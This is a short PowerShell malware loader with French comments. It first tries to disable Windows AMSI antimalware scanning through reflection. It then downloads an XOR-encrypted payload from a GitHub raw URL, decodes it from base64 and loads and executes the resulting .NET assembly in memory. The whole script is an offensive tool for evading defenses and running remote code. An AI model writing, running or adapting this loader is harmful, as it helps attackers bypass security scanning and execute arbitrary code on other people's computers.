# Bypass AMSI
$s='AmsiScanBuffer'
$p=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField($s,'NonPublic,Static')
$p.SetValue($null,[IntPtr]::Zero)

# Définir la clé XOR
$key=37

# Télécharger le payload chiffré
$wc=New-Object Net.WebClient
$enc=$wc.DownloadString("https://raw.githubusercontent.com/pzoaijfazepfja/runtimetest/refs/heads/main/enc.txt")  # Remplace avec ton URL

# Déchiffrer le contenu
$b64=""
foreach ($c in $enc.ToCharArray()){
    $b64+= [char]([byte][char]$c -bxor $key)
}

# Convertir Base64 en binaire
$bin=[Convert]::FromBase64String($b64)

# Charger et exécuter en mémoire
$asm=[System.Reflection.Assembly]::Load($bin)
$asm.EntryPoint.Invoke($null,$null)
